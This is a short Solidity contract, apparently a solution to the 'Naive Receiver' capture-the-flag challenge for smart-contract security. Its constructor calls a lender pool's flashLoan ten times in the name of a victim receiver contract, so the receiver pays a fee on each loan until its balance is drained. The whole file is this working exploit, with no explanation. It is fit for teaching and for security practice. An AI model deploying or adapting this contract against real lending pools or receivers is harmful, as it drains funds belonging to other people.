/// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface LenderPool {
    function flashLoan(address payable borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttack {
    constructor(address flashLoanReceiver, address lenderPoolAddress)  {
        for (uint256 i = 0; i < 10; i++) {
            LenderPool(lenderPoolAddress).flashLoan(
                payable(flashLoanReceiver),
                1
            );
        }
    }
}